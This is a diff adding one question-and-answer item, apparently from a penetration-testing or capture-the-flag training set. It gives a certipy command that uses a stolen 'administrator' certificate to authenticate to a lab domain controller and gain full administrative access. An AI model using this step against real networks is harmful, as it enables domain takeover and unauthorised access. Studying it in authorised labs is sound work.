@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you perform a final authentication using the obtained certificate?
+
+CONTEXT:
+You have the certificate for 'administrator'.
+
+METHOD / ANSWER:
+Command: `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72`
+Explanation: This command authenticates to the Domain Controller using the provided PFX certificate, enabling you to gain full administrative access.
